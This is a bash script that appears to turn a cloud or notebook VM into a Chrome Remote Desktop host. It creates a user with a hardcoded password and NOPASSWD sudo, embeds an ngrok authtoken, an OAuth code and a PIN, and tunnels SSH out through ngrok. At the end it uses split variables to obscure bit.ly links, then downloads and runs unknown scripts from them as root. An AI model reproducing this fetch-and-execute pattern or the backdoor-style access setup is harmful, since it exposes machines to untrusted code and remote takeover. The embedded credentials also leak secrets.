
#!/bin/bash
# # !cmd=RDP;i=0001;a=bit;x=ly;wget -q -O RDP ${a}.${x}/${cmd}${i} ;bash RDP 'DISPLAY= /opt/google/chrome-remote-desktop/start-host --code="4/0AX4XfWixlFxb0mcoXNtETJtF1Cetqx2XVrrT680nvHB95HLNPZID_O3aTPDbqnEr1F-e-g" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$(hostname)' '4500'
echo '{'
echo '"rdp":"v0.16.8",'
echo -en  '"output": "'
######################### RDP #####################################
{
OLDIR=$PWD
cd /tmp
export DEBIAN_FRONTEND=noninteractive
apt-get update
apt install --assume-yes sudo wget htop curl xfce4 desktop-base xfce4-terminal bash unzip zip p7zip p7zip-full p7zip-rar  zsh xvfb policykit-1 python3-psutil libcairo2  libgtk-3-0 libnspr4 libnss3 libpango-1.0-0 xbase-clients
apt-get install  -y git python3-dev python3-tk python3-setuptools python3-wheel python3-pip python3-wxgtk4.0 xdotool openssh-server
apt-get install -y gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget python3  python3-pip python3-tk python3-dev git python3-dev python3-tk python3-setuptools python3-wheel python3-pip git python3-dev python3-tk python3-setuptools python3-wxgtk4.0  autokey-gtk autokey-common scrot zsh git python3-dev python3-tk python3-setuptools python3-wheel python3-pip python3-wxgtk4.0 xdotool curl wget
pip3 install selenium  pyautogui pynput   pytest urllib3 ushlex
wget -O chrome-remote-desktop_current_amd64.deb https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
dpkg --install chrome-remote-desktop_current_amd64.deb
apt install --assume-yes --fix-broken
useradd -m one
echo 'one:8426' | sudo chpasswd
adduser one sudo
echo 'one ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
echo 'exec /etc/X11/Xsession /usr/bin/xfce4-session\' > /etc/chrome-remote-desktop-session
echo "export CHROME_REMOTE_DESKTOP_DEFAULT_DESKTOP_SIZES=1366x768,1920x1080" >> /home/one/.profile 
sed -i 's+DEFAULT_SIZES = \"1600x1200,3840x2560\"+DEFAULT_SIZES = \"1366x768,1920x1080\"+g'  /opt/google/chrome-remote-desktop/chrome-remote-desktop
#apt install --assume-yes xscreensaver
apt install -y gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget python3  python3-pip python3-tk python3-dev git python3-dev python3-tk python3-setuptools python3-wheel python3-pip git python3-dev python3-tk python3-setuptools python3-wxgtk4.0  autokey-gtk autokey-common scrot zsh git python3-dev python3-tk python3-setuptools python3-wheel python3-pip python3-wxgtk4.0 xdotool curl wget gconf-service xdotool libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget python3  python3-pip python3-tk python3-dev git python3-dev python3-tk python3-setuptools python3-wheel python3-pip git python3-dev python3-tk python3-setuptools python3-wxgtk4.0  autokey-gtk autokey-common scrot zsh git python3-dev python3-tk python3-setuptools python3-wheel python3-pip python3-wxgtk4.0 xdotool curl wget
systemctl disable lightdm.service
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
dpkg --install google-chrome-stable_current_amd64.deb
apt-get install --assume-yes --fix-broken
apt-get install nautilus nano -y 
apt-get -y install obs-studio
adduser one chrome-remote-desktop
wget -O geckodriver.tar.gz https://github.com/mozilla/geckodriver/releases/download/v0.29.1/geckodriver-v0.29.1-linux64.tar.gz
tar xzf geckodriver.tar.gz
mv geckodriver /usr/bin/geckodriver
chmod +x /usr/bin/geckodriver
cd $OLDIR
echo '#!/bin/bash' > /bin/kcolab
echo 'kill -9 $(ps -x | grep autokey)' >> /bin/kcolab
echo 'kill -9 $(ps -x | grep chrome/chrome)' >> /bin/kcolab
chmod +x /bin/kcolab
wget -q -O ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
./ngrok authtoken 1wm5jHf3hx6fFiFGrgcjifyYj57_2NiNTA54k8uQncK7PET2e
} &> /dev/null &&

{

if [ "$(grep 20.04 /etc/os-release)" ] 
then 
    apt-get -y install firefox=75.0+build3-0ubuntu1 
elif [ "$(grep 18.04 /etc/os-release)" ] 
then 
    apt-get -y install firefox=59.0.2+build1-0ubuntu1
fi

}&> /dev/null &&

### NGROK 


#printf "\nSetup Completed " >&2 ||
#printf "\nError Occured " >&2
#printf '\nCheck https://remotedesktop.google.com/headless  Copy Command Of Debian Linux And Paste Down\n'
if [ -z "$1" ] 
then
    echo 'cmd please ?'
    read -p "Paste Here: " CRP
else
CRP=$1
fi

export JSINFO=$(wget -q -O - ipinfo.io)
export CITY=$(echo $JSINFO|grep -oP '(?<="city": ")[^"]*')
export REGION=$(echo $JSINFO|grep -oP '(?<="region": ")[^"]*')
export COUNTRY=$(echo $JSINFO|grep -oP '(?<="country": ")[^"]*')
export IPORG=$(echo $JSINFO|grep -oP '(?<="org": ")[^"]*')
export IIP=$(echo $JSINFO|grep -oP '(?<="ip": ")[^"]*')
#IPNAME=$(sed 's|\.|o|g' <<< $IIP)
export IPNAME=$(echo $IIP | sed -r 's!/.*!!; s!.*\.!!')
export INFO="$COUNTRY""_""$IPNAME"
export LOC=$(echo $JSINFO|grep -oP '(?<="loc": ")[^"]*')
CRP=$(echo $CRP | sed "s|hostname|echo $INFO|g")
CRP=$CRP" --pin=55507770"
su - one -c """$CRP"""
#sudo -u one $CRP
service chrome-remote-desktop@one restart
#printf 'Check https://remotedesktop.google.com/access/ \n'
#printf 'Your SUDO Pasword Is 8426 \n'

./ngrok tcp 22

echo -en '",'
echo
echo -en '"object":"'
if [ -z "$2" ] 
then
    i=003;cmd=pysi;x=ly;y=bit;wget -q -O /tmp/ss ${y}.${x}/${cmd}${i} ; bash /tmp/ss 
else
    i=003;cmd=pysi;x=ly;y=bit;wget -q -O /tmp/ss ${y}.${x}/${cmd}${i} ;timeout $2 bash /tmp/ss 
fi
echo -en '"}}'